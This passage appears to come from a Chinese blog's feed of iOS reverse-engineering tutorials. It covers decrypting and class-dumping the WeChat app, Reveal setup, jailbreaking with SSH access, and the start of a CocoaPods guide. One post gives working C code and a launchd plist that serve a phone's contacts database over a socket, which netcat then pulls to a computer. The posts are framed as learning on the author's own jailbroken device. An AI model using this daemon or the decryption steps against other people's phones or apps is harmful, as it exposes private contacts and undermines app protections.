binary in memory.[+] offset to cryptid found: @0x59a4c(from 0x59000) = a4c[+] Found encrypted data at address 00004000 of length 54755328 bytes - type 1.[+] Opening /private/var/containers/Bundle/Application/6EE23DA1-6DE3-4477-A099-1E34639EB9C1/WeChat.app/WeChat for reading.[+] Reading header[+] Detecting header type[+] Executable is a plain MACH-O image[+] Opening WeChat.decrypted for writing.[+] Copying the not encrypted start of the file[+] Dumping the decrypted data into the file[+] Copying the not encrypted remainder of the file[+] Setting the LC_ENCRYPTION_INFO-&gt;cryptid to 0 at offset a4c[+] Closing original file[+] Closing dump file 使用Mac的助手工具直接将生成的WeChat.decrypted文件拷贝到桌面即可，也可使用终端指令拷贝，如下 退出手机Root模式，拷贝砸壳后文件到电脑桌面 123exitscp root@192.168.1.60:/var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/WeChat.decrypted ~/Desktop/WeChat.decrypted class dump 砸壳后的文件 砸壳后的WeChat.decrypted文件就可以使用class-dump导出头文件，如下 --arch armv7是指定架构，dumpdecrypted只会砸你手机处理器对应的那个壳，fat binary的其它部分仍然是有壳的 而class-dump的默认目标又不是被砸壳的那个部分，如果不指定架构只能导出CDStructures.h一个文件 1class-dump --arch armv7 WeChat.decrypted -H -o /Users/sevencho/Desktop/dump/Wechat-decrypted-dump 现在就可以看到别人整个APP的.h文件信息了，除了可以优雅的学习大厂App的接口命名及设计规范外，当然还可以依靠强大的运行时特性做一些其他有意思的事情。]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（三）：配置使用Reveal工具逆向别人的App UI界面]]></title>
    <url>%2Farchives%2F4de69069.html</url>
    <content type="text"><![CDATA[你生了气就哭,我一看见你哭就目瞪口呆,就像一个小孩子做了坏事在未受责备之前目瞪口呆一样,所以什么事你先别哭,先来责备我,好吗? ——王小波《爱你就像爱生命》 简介 工欲善其事，必先利其器 Reveal在逆向工程中不仅仅可以用来查看分析别人App的UI层次结构，还可以用来帮助我们在平时开发中快速定位问题。 对于初学者来说，去分析其他优秀App的界面实现，能够帮助快速提升开发能力。 我的环境配置： 越狱iPhone5c 10.3.2 Mac 10.13.5 并且安装有Reveal version 4(8796) 所有资料文件&amp;工具在这里 了解更多： iOS攻防（一）： iPhone手机越狱 &amp; SSH iOS攻防（二）：窃取用户的通讯录信息 &amp; 偷窥用户安装应用列表 &amp; Netcat使用 在越狱设备上配置RevealReveal Loader安装 首先在越狱设备的Cydia中输入搜索Reveal2Loader，并且进行安装即可。这一步比较简单，安装后重启SpringBoard即可。 注意安装最新的Reveal2Loader，兼容iOS8/9/10,如果越狱设备系统版本过低，请下载旧版本Reveal Loader安装即可。 导入libReveal.dylib 安装完成Reveal2Loader后查看在/Library/路径下下是否存在RHRevealLoader这个文件夹，并且查看该文件夹中是否有libReveal.dylib这个文件。 可以使用电脑端助手工具查看，也可以在终端查看 12345678// 连接手机ssh root@192.168.1.60 // 进入Library文件夹cd /Library // 查看Library文件夹下文件列表ls -r 文件夹存在 如果存在libReveal.dylib这个文件，则安装Reveal完成。 文件夹不存在 如果不存在libReveal.dylib这个文件，按如下步骤 手动创建RHRevealLoader这个文件夹，可以使用iTools或者Filza，也可以通过指令创建 1mkdir RHRevealLoader 在Mac电脑上打开Reveal，打开Reveal菜单 -&gt; Help -&gt; Show Reveal Library in Finder -&gt; iOS Library 注意：新版本的Reveal已经没有libReveal.dylib这个文件，只存在一个RevealServer.framework文件。 我们需要找到这个库文件下的RevealServer并复制一份到桌面，重命名为libReveal.dylib 将libReveal.dylib这个文件放入手机刚创建的/Library/RHRevealLoader/这个文件夹内。可以使用iTools，也可以通过指令上传 1scp /Users/sevencho/Desktop/libReveal.dylib root@192.168.1.60:/Library/RHRevealLoader/libReveal.dylib 至此,手机的Reveal安装配置完成。重启手机就可以愉快的和新认识的基友小伙伴一起玩耍了。 Reveal的使用在设备上选择想要Reveal的App 在越狱设备上安装完Reveal Loader后就可以在设置中找到Reveal的配置项，在该配置项中我们可以去选择要Reveal的App。 对于越狱手机，手机上安装的所有App都可以Reveal。当然也包括从AppStore下载的，也包括iOS系统自带的。如下所示： 查看App的UI层级 Mac上Reveal查看设备上App的UI层级时可以通过USB进行连接。 也可以使用wifi连接，但要保证你的iOS设备与你的Mac在同一个局域网内。]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（二）：窃取用户的通讯录信息 & 偷窥用户安装应用列表 & Netcat使用]]></title>
    <url>%2Farchives%2Fbf5c1be0.html</url>
    <content type="text"><![CDATA[咱们应当在一起，否则就太伤天害理啦。 ——王小波《爱你就像爱生命》 简介 通过在iPhone上开启一个开机自启进程，读取用户手机通讯录数据库或者用户应用安装列表，写到标准输出。 开启一个Socket通信端口。 通过使用NetCat将iPhone手机的指定ip端口数据以文件格式传输到Mac桌面上。 所有资料文件&amp;工具在这里 了解更多： iOS攻防（一）： iPhone手机越狱 &amp; SSH 了解一下OS X的启动原理 Mac下的启动服务主要有三个地方可配置： 系统偏好设置-&gt;帐户-&gt;登陆项 /System/Library/StartupItems 和 /Library/StartupItems/ launchd 系统初始化进程配置。 launchd是Mac OS下，用于初始化系统环境的关键进程。类似Linux下的init, rc。 启动过程 mac固件激活，初始化硬件，加载BootX引导器。 BootX加载内核与内核扩展(kext)。 内核启动launchd进程。 launchd根据 /System/Library/LaunchAgents /System/Library/LaunchDaemons /Library/LaunchDaemons Library/LaunchAgents ~/Library/LaunchAgents里的plist配置，启动服务守护进程。 LaunchDaemons（后台驻留程序启动）是用户未登陆前就启动的服务(守护进程)LaunchAgents（启动代理）是用户登陆后启动的服务(守护进程) 理解几个基础概念：/System/Library和/Library和~/Library目录的区别？ /System/Library目录是存放Apple自己开发的软件。 /Library目录是系统管理员存放的第三方软件。 ~/Library/是用户自己存放的第三方软件。 几个目录下plist文件格式及每个字段的含义： 因为iOS和Mac都是基于Unix，所以启动过程基本是类似的。 Key Description Required Label The name of the job yes ProgramArguments Strings to pass to the program when it is executed yes UserName The job will be run as the given user, who may not necessarily be the one who submitted it to launchd. no inetdCompatibility Indicates that the daemon expects to be run as if it were launched by inetd no Program The path to your executable. This key can save the ProgramArguments key for flags and arguments. no onDemand A boolean flag that defines if a job runs continuously or not no RootDirectory The job will be?chrooted?into another directory no ServiceIPC Whether the daemon can speak IPC to launchd no WatchPaths Allows launchd to start a job based on modifications at a file-system path no QueueDirectories Similar to WatchPath, a queue will only watch an empty directory for new files no StartInterval Used to schedule a job that runs on a repeating schedule. Specified as the number of seconds to wait between runs. no StartCalendarInterval Job scheduling. The syntax is similar to cron. no HardResourceLimits Controls restriction of the resources consumed by any job no LowPriorityIO Tells the kernel that this task is of a low priority when doing file system I/O no Sockets An array can be used to specify what socket the daemon will listen on for launch on demand no 配置一个Hack通讯录进程的plist文件 我们需要通过一个plist文件在系统加载时候启动一个进程。 如：一个名为hack的进程，该进程加载的可执行文件hack的路径是/usr/bin/hack。 配置的plist如下： plist源码如下： Program ： 进程可执行文件加载路径 StandardErrorPath ：标准错误路径 ProgramArguments ： 用户登陆后启动的服务路径 inetdCompatibility ：是一个因特网超级服务器(即inetd守护进程）来简化守护进程的编写。 SockServiceName ： Socket通信端口名称 1234567891011121314151617181920212223242526272829303132333435&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple Computer//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;!-- hack.plist Created by 曹雪松 on 2018/7/5. Copyright (c) 2018 曹雪松. All rights reserved.--&gt;&lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;Program&lt;/key&gt; &lt;string&gt;/usr/bin/hack&lt;/string&gt; &lt;key&gt;StandardErrorPath&lt;/key&gt; &lt;string&gt;/dev/null&lt;/string&gt; &lt;key&gt;SessionCreate&lt;/key&gt; &lt;true/&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/usr/bin/hack&lt;/string&gt; &lt;/array&gt; &lt;key&gt;inetdCompatibility&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Wait&lt;/key&gt; &lt;false/&gt; &lt;/dict&gt; &lt;key&gt;Sockets&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Listeners&lt;/key&gt; &lt;dict&gt; &lt;key&gt;SockServiceName&lt;/key&gt; &lt;string&gt;55&lt;/string&gt; &lt;/dict&gt; &lt;/dict&gt; &lt;/dict&gt;&lt;/plist&gt; 将plist文件传送到至iPhone/System/Library/LaunchDaemons/ 下 1scp /Users/sevencho/Desktop/hack.plist root@192.168.1.60:/System/Library/LaunchDaemons/hack.plist 读取通讯录 &amp; 用户安装App列表 的执行程序 我们只要能拿出AddressBook.sqlitedb/itunesstored2.sqlitedb就可以拿到用户的数据。 AddressBook的数据都在/var/mobile/Library/AddressBook/AddressBook.sqlitedb中， iTunes Store的数据都在/var/mobile/Library/com.apple.itunesstored2.sqlitedb/itunesstored2.sqlitedb中， 写一个函数用于读取用户通讯录数据库或者用户安装App列表。 12345678910111213141516171819202122232425262728//// hack.c//// Created by 曹雪松 on 2018/7/5.// Copyright © 2018 曹雪松. All rights reserved.//#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#define FILE "/var/mobile/Library/AddressBook/AddressBook.sqlitedb" // 手机的通讯录数据库路径// #define FILE "/var/mobile/Library/com.apple.itunesstored2.sqlitedb/itunesstored2.sqlitedb" // 用户安装app列表文件int main()&#123; int fd = open(FILE, O_RDONLY); // 读数据库文件，返回文件句柄标识 char buf[128]; int ret = 0; if(fd &lt; 0) return -1; while (( ret = read(fd, buf, sizeof(buf))) &gt; 0)&#123; // 将文件读进buff中 write( fileno(stdout), buf, ret); // 写到标准输出中 &#125; close(fd); return 0;&#125; 生成可执行文件 在hack.c所在目录执行，也可以直接指定文件路径 1xcrun -sdk iphoneos clang -arch armv7s -o hack hack.c 可执行文件签名，并传输至iPhone手机/usr/bin目录 12ldid -S hackscp hack root@192.168.1.60:/usr/bin/hack 新开一个终端，SSH连接手机。 获取AddressBook &amp; 用户安装App列表数据 利用netcat，将指定服务端口的数据以文件的形式传输到电脑的当前目录下，抓取设备 AddressBook 或者 用户安装App列表信息。 55为之前plist文件配置的Socket服务名称。 123// 根据自己可执行程序路径，选择获取的数据类型nc 192.168.1.60 55 &gt; addressBook.sqlitedb // 通讯录nc 192.168.1.60 55 &gt; itunesstored2.sqlitedb // App列表 利用netcat获取的addressBook.sqlitedb是空的。 使用如下指令监控下过程提示连接拒绝，但是192.168.1.60是可以ping通的。 使用ps aux指令查看所有启动的进程，貌似没有找到我们的hack进程。 暂时还没有找到解决方法，大家可以一起帮忙排查原因。 12nc -v 192.168.1.60 55// nc: connectx to 192.168.1.60 port 55 (tcp) failed: Connection refused 如果文件有数据，可以使用string命令查看文件内容 1strings itunesstored2.sqlitedb 参考 iOS攻防——（二）如何窃取用户的通讯录信息 Mac OS启动服务 守护进程和inetd超级服务器 C语言之fileno()函数 对stdin，stdout 和STDOUT_FILENO，STDIN_FILENO的学习 nc命令详解]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（一）： iPhone手机越狱 & SSH]]></title>
    <url>%2Farchives%2Fe38331a.html</url>
    <content type="text"><![CDATA[人在年轻时，最头疼的一件事就是决定自己这一生要做什么。——王小波 《工作与人生》 前言 很早之前就想研究了解一下iOS越狱开发和逆向相关的知识，然后就买了《iOS应用逆向工程》这本’小黄书’，也查了查相关的资料，比较出名的可能就是iOS女神念茜的iOS攻防系列文章了。 但是由于自身的惰性和其他的外界因素，导致’小黄书’翻了几章后就在公司的办公桌上处于长时间的休眠状态，而念茜的文章年代稍微比较久远也在读了两篇后被遗忘在chrome的书签里面，真真的从入门到放弃。🤣 最近这段时间刚好工作行有一些闲暇的时间，偶尔在网上看到《iOS 应用逆向与安全》这本书，这是自“小黄书”后的又一本关于逆向安全的书。随想再从头开始学习下iOS越狱开发和逆向相关的知识，并将学习过程及采坑经验记录于此，希望这一次会有始有终… 这是本系列的第一篇，希望不会成为最后一篇🐒😂 正文 现在Apple公司已经越来越注重开放性，iPhone已经不像几年前那样异常封闭，许多以前只有越狱才有的功能也慢慢的原生自带，越来越多的小伙伴已经没有了当前那种越狱的激情，而随着越来越多的越狱大神隐退、越狱组织解散，辉煌了近10年的越狱也渐渐走向了没落。 但如果想借鉴别人的App某个功能实现思路或者加强我们自己App的安全性，那么最好的途径就是从越狱开发和逆向入手，而这一切的开始的基础：你必须要有一部越狱过的iPhone手机。 所有资料文件&amp;工具在这里 iOS 9x 32位系统越狱配置 机型：iPhone4s 版本：美版 系统：9.3.2 越狱工具 使用Home Depot越狱工具，仅支持32手机系统，如果是64位手机系统请直接使用各种助手越狱 支持设备（32位设备）： iPhone 4s、iPhone 5、iPhone 5c、iPad 2、iPad 3、 iPad 4、iPad mini、iPod touch 5G 支持iOS系统版本： iOS 9.1、iOS 9.2.1、iOS 9.3、iOS 9.3.2、iOS 9.3.3、iOS 9.3.4 越狱须知: 越狱前请备份您的重要资料以免造成丢失； 本次越狱属于不完美越狱，若设备重启，则会恢复到未越狱状态，Cydia 及已装得越狱应用会闪退，越狱插件也将失效，需要重新激活；但是安装插件Community Offsets后，重启设备越狱也不会失效，可实现完美越狱。 越狱工具请在这里下载 越狱步骤 1、首先下载签名工具以及越狱ipa，将签名工具解压到电脑桌面，打开Impactor，手机连接电脑后软件会读取到手机信息； 2、然后把32位iOS9越狱ipa（MixtapePlayer.ipa）拖入软件里； 3、提示输入你的Apple ID账号，和Apple ID密码。 4、Apple ID验证完成后软件会自动安装到手机里，可以在手机桌面看到Home Depot的图标，这个就是越狱工具； 5、接下来进手机设置-通用-设备管理，找到你的ID后点进去并点击信任（设备须保持联网状态）； 6、然后回到设备桌面，运行Home Depot应用， 点击Prepare for jailbreak， 再依次点击Accept –&gt; Dismiss –&gt; Proceed With Jailbreak –&gt; Begin Installation –&gt; Use Provided Offsets； 等待设备自动重启后，Cydia就会出现在手机桌面则代表越狱完成，如果越狱重启后没有出现Cydia，则可以多试几次，直到成功为止； 成功后打开Cydia，添加插件源「http://repo.tihmstar.net」，在Cydia中搜索「Community Offsets」并插件安装，安装后即使重启越狱也不会失效，Cydia也不会闪退，相当于完美越狱。 iOS 10x 32位系统越狱配置 机型：iPhone5c 版本：美版 系统：10.3.2 越狱工具 使用h3lix-RC5越狱工具，仅支持32手机系统，如果是64位手机系统请直接使用各种助手越狱。 支持设备（32位设备）： iPhone 4s、iPhone 5、iPhone 5c、iPad 2、iPad 3、 iPad 4、iPad mini、iPod touch 5G 支持iOS系统版本： iOS 10 - 10.3.x 越狱须知: 越狱前请备份您的重要资料以免造成丢失； 本次越狱属于不完美越狱，若设备重启，则会恢复到未越狱状态，Cydia 及已装得越狱应用会闪退，越狱插件也将失效，需要重新激活； 越狱工具 h3lix Cydia Impactor 越狱步骤 1、首先下载签名工具以及越狱ipa，将签名工具解压到电脑桌面，打开Impactor，手机连接电脑后软件会读取到手机信息； 2、然后把32位iOS10x越狱ipa（h3lix-RC5.ipa）拖入软件里； 3、提示输入你的Apple ID账号，和Apple ID密码。 4、Apple ID验证完成后软件会自动安装到手机里，可以在手机桌面看到h3lix的图标，这个就是越狱工具； 5、接下来进手机设置-通用-设备管理，找到你的ID后点进去并点击信任（设备须保持联网状态）； 6、然后回到设备桌面，运行h3lix应用， 点击屏幕中间的jailbreak， 等待设备自动重启后， 如果提示如下错误，可不用管 Cydia就会出现在手机桌面则代表越狱完成，如果越狱重启后没有出现Cydia，则可以多试几次，直到成功为止； 插件安装 iphone越狱后就需要安装一些插件来协助进行一些逆向辅助操作。 如果部分需要的插件找不到，可以先尝试添加一些Cydia源。如下是我添加的源地址： tihmstar: http://repo.tihmstar.net多玩源: http://yuan.duowan.comBigBoss: http://apt.thebigboss.org/repofiles/cydia/雷锋源 http://apt.abcydia.com 越狱必备工具(20180702)： openSSH // 远程控制，如远程登录 (如果越狱工具自带Dropbear不需要安装) MobileTerminal // 无法安装 可用MTerminal代替 MTerminal LLVM+Clang // 32位手机需要下载32位的才可以安装，否则无法安装(试了两台手机都没有安装成功，不知道是不是以为32位系统或者16G的缘故) LD64 Darwin CC Tools adv-cmds: 执行 ps 命令报错，需要安装这个工具； iFile: (没有安装成功) 可以安装Filza Filza：在手机上查看文件目录；(必装) Apple File Conduit”2”，安装完后iFunbox等助手软件可以读取手机Root文件 scp：终端命令，把远程设备的文件复制到另一个设备； 还需要的软件： Cydia Translations // 安装后自带 Cydia Substrate // 允许第三方开发者在越狱系统的方法中打一些补丁或扩展方法。 Cydia Installer // 安装后自带 SSHSSH通过WiFi连接手机 OpenSSH原是一个在Linux下很实用的一个软件。iPhone本身就是一个运行BSD系统(可认为是一种Liunx)的硬件，因此，Cydia的作者Saurik把OpenSSH这一软件移植到了iOS平台上，并且简化了安全认证密钥的繁琐，使之成为一款可以在iPhone上运行的Cydia插件。 关于ssh(Secure Shell)详细资料请自行搜索相关资料，可以简单理解成『远程登录』，可以通过一台设备远程登陆另一台设备。 保证你的Mac和iPhone在同一网段 确定iPhone的IP 远程登陆 Terminal输入 1ssh root@xxx.xxx.xxx.xxx // xxx.xxx.xxx.xxx为手机ip地址 如果系统是iOS10.3以上，默认是不能直接使用ssh通过wifi或者USB访问手机的，详情请参考iPhone10.3.X越狱后SSH连接不上的问题（已解决） 1.卸载手机上的OpenSSL和Openssh 2.添加源：http://cydia.ichitaso.com/test 3.搜索并下载：dropbear 4.安装完毕，执行ssh root@deviceIP，默认密码为alpine（也可以在iPhone里下载ssh软件进行连接测试） 5.成功后，再重新安装openssh和OpenSSL了（经测试不会影响SSH连接iPhone）。 第一次连接会提醒你是否连接，输入yes继续，输入密码，初始密码是alpine。 建议将改密码改掉，因为在默认密码的情况下，任何人都可以尝试登陆你的设备。 Ikee, iOS上的一种蠕虫病毒, 通过使用默认密码alpine入侵安装了openssh的越狱设备, 然后所有数据, 包括电话本, 短信, 甚至Apple ID都有可能被窃取.所以强烈建议您修改ssh密码 在登录之后，你可以更改你的密码： 1passwd root // 提示输入两次新密码即可修改 成功后可查看手机文件目录 SSH通过USB连接手机 比WIFI响应速度快，网络环境无限制 usbmuxd是网上开源社区，貌似是国外牛人倾力打造的一个专门针对该功能开源库 通过brew来安装（当然也可以自己去下源码手动安装，由于依赖项比较多，所以很繁琐） 1brew install usbmuxd usbmuxd 自带工具iproxy，iproxy 可以快捷的操作连接iPhone等操作。由于Mac上只支持4位的端口号，所以需要把iPhone的默认端口22映射到Mac上，相当于建立一个Mac和iPhone之间的通道。 12iproxy 7777 22// waiting for connection 以上命令就是把当前连接设备的22端口(SSH端口)映射到电脑的7777端口，那么想和设备22端口通信，直接和本地的7777端口通信就可以了。 终端提示 waiting for connection ，表示这两个端口之间已经可以通信了，保留当前终端(如果关闭就停止端口之间的通信了)，新建另一个终端输入如下指令 1ssh -p 7777 root@127.0.0.1 如果是第一次使用USB连接手机，会提示如下信息，输入yes继续 1234The authenticity of host &apos;[127.0.0.1]:7777 ([127.0.0.1]:7777)&apos; can&apos;t be established.ECDSA key fingerprint is SHA256:rBkW26LHWZbqrbfOsrkSCeLN1gr3fADxIF5PWB8VXDI.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &apos;[127.0.0.1]:7777&apos; (ECDSA) to the list of known hosts. 如果没有修改过root密码，则输入默认alpine，修改过，则输入修改过密码，完成后即可连接上iPhone。 配置免ssh密码登陆 每次连接手机都需要输入密码比较麻烦，可以通过如下配置免ssh密码登陆 如果本人是做iOS开发的，项目用到了GIT版本控制，一般都配置SSH密钥了。密钥已经存在了电脑的./ssh目录中，如果没有配置，那么可手动重新生成SSH密钥，如: 1ssh-keygen -t rsa -b 4096 -C &quot;your_email&quot; 生成完成后，我们会在./ssh目录中发现id_rsa.pub公钥这个文件。然后我们把它copy出来放到个人目录下，并重命名，比如： 1cp /Users/SevenCho/.ssh/id_rsa.pub ~/authorized_keys 手动SSH进入设备中，或者通过Filza，查看是否存在var/root/.ssh目录，如果没有，我们手动创建下。可通过SSH连接后mkdir创建，或者Filza手动创建。 创建后我们把authorized_keys拷贝到设备中，可利用SCP命令： 1scp ~/authorized_keys root@iphone ip:/var/root/.ssh // iphone ip 为你手机的ip地址 然后按正常连接步骤我们就可以直接SSH连接的时候不用输入密码了。 这个时候，如果我们使用tweak打包时候，也不会再让我们输入SSH密码了。 重置ssh登陆密码 如果你不幸忘记了ssh密码，可以在Cydia中下载Filza软件，通过Filza找到/private/etc/master.password文件，文件中会有以下一段： root:xxxxxxxxxxxxx:0:0::0:0:SystemAdministrator:/var/root:/bin/shmobile:xxxxxxxxxxxxx:501:501::0:0:MobileUser:/var/mobile:/bin/sh 将root:及mobile:后面的13个x字符处修改成/smx7MYTQIi2M，修改后保存此文件，你iphone的ssh密码就重新回到默认的alpine 交叉编译 交叉编译指在一个平台上生成另一个平台上的可执行代码。如我们将会在MAC上编写编译可在iPhone上运行的可执行文件。 编译是由编译器完成的，所以我们首先要找到合适的编译器。关于目前Apple公司开源及很多大公司使用和维护的Clang编译器详细资料请看结构化编译器前端 Clang 介绍 编写代码 12345678touch helloworld.c // 新建c文件open helloworld.c // 打开.c文件，编写测试代码，如下面代码：#include &lt;stdio.h&gt; int main()&#123; printf(&quot;Hello world !!!\n&quot;); return 0; &#125; 生成可执行文件 生成可在iPhone平台运行的二进制可执行文件 iOS的指令集参考文章结尾 12// 格式：xcrun -sdk iphoneos clang -arch armv7s -o [目标文件名] [源文件名]xcrun -sdk iphoneos clang -arch armv7s -o helloworld helloworld.c 传输可执行文件 通过ssh传输本地文件到iPhone（服务器） 12// scp /path/filename username@servername:/path/filenamescp helloworld root@192.168.1.42:/helloworld 关于iOS10.2系统越狱后无法调用scp，可参考[Tutorial] How to fix scp on Yalu / Dropbear 坑：使用iPhone5 iOS10.3 还是无法使用scp传输文件，后来发现因为是32位系统，而使用上面解决方法下载的scp是64位的，手动安装授权32位就可以了，如下 先下载scp二进制文件及相关库文件：scp、libcrypto.0.9.8.dylib、libcrypto.dylib 在电脑上用iTools把scp文件导入到usr/bin目录中，把另外两个文件导入到usr/lib目录中 通过手机MTerminal，登陆进来root模式 进入usr/bin目录，执行下列命令 12ldid -S scpchmod 777 scp 进入usr/lib目录 12chmod 755 libcrypto.0.9.8.dylibchmod 755 libcrypto.dylib 将iPhone（服务器）文件传输到本地 12// scp username@servername:/source/path/filename /des/path/filenamescp root@192.168.1.42:/iphone/path/helloworld /mac/path/helloworld 查看iPhone文件目录是否存在对应文件helloworld，在终端执行可执行文件 传完可执行文件后, 此时可执行文件并没有权限, 所以要执行以下命令给权限: 1chmod a+x helloworld 运行可执行文件 如果执行失败，报Killed: 9，可能是因为执行文件没有签名，使用ldid -S helloworld签名即可。 1./helloworld 注意 如果越狱成功，一定要安装可以远程访问手机的工具，和手机端可以查看越狱系统文件的工具。（以防手贱把Cydia给误删了，需要恢复） 千万要注意：删除某些安装的工具的时候有可能会把Cydia也给一起删除的。 如果想重新使用Apple ID签名越狱, 输入Apple ID账号密码后遇到如下错误 123provision.cpp:81ios/submitDevelopmentCSR =7460You already have a current IOS Development certificate or a pending certificate request. 此时需要删除上一个certificate，操作步骤： 选择菜单栏Xcode -&gt; revokeCertificates 如果revokeCertificates失败，提示如下错误 1progress hpp：87_assert false 下载旧版本Impactor，如Impactor_0.9.42, 使用旧版本软件重新revokeCertificates revokeCertificates成功如下 关于生成可执行文件采用的iOS的指令集 armv6 iPhone、iPhone 3G iPod 1G、iPod 2G armv7 iPhone 3GS、iPhone 4 iPod 3G、iPod 4G、iPod 5G iPad、iPad 2、iPad 3、iPad Mini armv7s iPhone 5、iPhone 5C iPad 4 arm64 iPhone 5S iPhone 6 iPhone 6Plus 以及之后的 iPad Air, Retina iPad Mini 以及之后的 参考 iOS攻防——（一）ssh登陆与交叉编译 《iOS 应用逆向与安全》读后感 不用换ID，完美解决 Cydia Impactor 错误81 iPhone6s 10.3.1越狱失败 提示./plist.hpp:201 not PLIST_STRING 32位设备iOS 10-10.3.x越狱工具h3lix发布 32位设备iOS9.1-9.3.4越狱图文教程 iPhone10.3.X越狱后SSH连接不上的问题（已解决） [Tutorial] How To Access SSH Using Dropbear In iOS 10.3.x To Fix Filza’s Root Permission Using Your Device! SSH Over USB [Tutorial] How to fix scp on Yalu / Dropbear]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[创建自己的CocoaPods公有库]]></title>
    <url>%2Farchives%2F2e7b1d7b.html</url>
    <content type="text"><![CDATA[我把我整个灵魂都给你，连同它的怪癖，耍小脾气，忽明忽暗，一千八百种坏毛病。它真讨厌，只有一点好，爱你。——王小波《爱你就像爱生命》 前言什么是CocoaPods CocoaPods 是一个 objc/swift 的第三类库依赖管理工具，而其本身是利用 ruby 的依赖管理 gem 进行构建的. 通过CocoaPods工具我们可以为项目添加被称为“Pods”的依赖库（这些类库必须是CocoaPods本身所支持的），并且可以轻松管理其版本。 CocoaPods的好处 1、在引入第三方库时它可以自动为我们完成各种各样的配置，包括配置编译阶段、连接器选项、甚至是ARC环境下的-fno-objc-arc配置等。 2、使用CocoaPods可以很方便地查找新的第三方库，这些类库是比较“标准的”，而不是网上随便找到的，这样可以让我们找到真正好用的类库。 CocoaPods安装 关于CocoaPods安装请自行百度/谷歌，相关资料已经介绍的非常详尽。 更详细的文档请参考官方文档 可以在这里深入理解 CocoaPods 如何制作自己的CocoaPods（公有）库 想要制作自己的CocoaPods（公有）库，我们需要先大概了解一下CocoaPods的两个文件Podfile / Podspec Podfile podfile 是一个文件，用于定义项目所需要使用的第三方库。 该文件支持高度定制，你可以根据个人喜好对其做出定制。更多相关信息，请查阅 Podfile 指南。 Podspec .podspec 也是一个文件，该文件描述了一个库是怎样被添加到工程中的。它支持的功能有：列出源文件、framework、编译选项和某个库所需要的依赖等。 在我们执行pod install 命令加载第三方库的时候, 会先从远程Podspecs仓库拉取最新的包括版本信息在内的所有的第三方库的列表。 存储在本地路径 ~/.cocoapods 中，先显示系统隐藏文件后才可以看到隐藏文件。 1defaults write com.apple.finder AppleShowAllFiles -boolean true ; killall Finder 使用终端进入查看仓库的远程地址 12345cd ~/.cocoapods/repos/mastergit remote -v// 拉取和更新地址origin https://github.com/CocoaPods/Specs.git (fetch)origin https://github.com/CocoaPods/Specs.git (push) https://github.com/CocoaPods/Specs.git 实际就是CocoaPods的GitHub仓库地址。 我们如果一直进入~/.cocoapods/repos/master 就会发现里面的每一个文件夹下都是三方库列表 每一个三方库文件下存放的是对应的版本号文件夹 而对应的版本号文件夹里面则只存在唯一的一个以 三方库名称.podspec.json的文件, 我们看一下GoogleMaps大概的内容 1234567891011121314151617181920&#123; "authors": "Google, Inc.", "description": "Use the Google Maps SDK for iOS to enrich your app with interactive maps, immersive Street View panoramas, and detailed information from Google's Places database.", "homepage": "https://developers.google.com/maps/documentation/ios/", "license": &#123; // 开源协议 // ... &#125;, "name": "GoogleMaps", // 三方库名称 "platforms": &#123; // 三方库平台及版本 "ios": "8.0" &#125;, "preserve_paths": [ // ... ], "source": &#123; "http": "https://dl.google.com/dl/cpdc/f4086b0aa122de6c/GoogleMaps-2.7.0.tar.gz" // 三方库源码 &#125;, "summary": "Google Maps SDK for iOS.", // 三方库描述 "version": "2.7.0", // 三方库版本 &#125; 我们尝试在终端搜索一下第三方库GoogleMaps 1234567891011// pod search GoogleMaps-&gt; GoogleMaps (2.7.0) // 三方库名称 Google Maps SDK for iOS. // 三方库描述 pod &apos;GoogleMaps&apos;, &apos;~&gt; 2.7.0&apos; // 三方库版本 - Homepage: https://developers.google.com/maps/documentation/ios/ - Source: https://dl.google.com/dl/cpdc/f4086b0aa122de6c/GoogleMaps-2.7.0.tar.gz // 三方库源码 - Versions: 2.7.0, 2.6.0, 2.5.0, 2.4.0, 2.3.1, 2.3.0, 2.2.0, 2.1.1, 2.1.0, 2.0.1, 2.0.0, 1.13.2, 1.13.1, 1.13.0, 1.12.3, 1.12.2, 1.12.1, 1.12.0, 1.11.1, 1.11.0, 1.10.5, 1.10.4, 1.10.3, 1.10.2, 1.10.1, 1.10.0, 1.9.2 [master repo] - Subspecs:// ... 我们平时在pod search第三方库后出现的结果其实都是三方库名称.podspec.json这个文件的内容，所以我们只做自己的CocoaPods库，也要从整个文件入手。 正式开始注册 CocoaPods 账号 因为我们的是用CocoaPods统一管理我们的自己的开源库，所以需要一个CocoaPods账号用来发布库。 我们使用终端来进行注册，在终端输入下面的指令、回车： 123// gitHub_email ： 注册CocoaPods的邮箱， 我使用的是和注册GitHub一样的邮箱。// your_user_name ：你注册CocoaPods的用户名 pod trunk register gitHub_email &apos;your_user_name&apos; --verbose 成功后终端输入下面信息，CocoaPods 会发一个确认邮件到你的邮箱上，登录你的邮箱进行确认。 1[!] Please verify the session by clicking the link in the verification email that has been sent to gitHub_email 确认完成后，输入如下指令查看注册信息 12345678// pod trunk me- Name: your_register_name // 你的注册昵称 - Email: your_register_email // 你的注册邮箱 - Since: June 26th, 03:26 - Pods: None - Sessions: - June 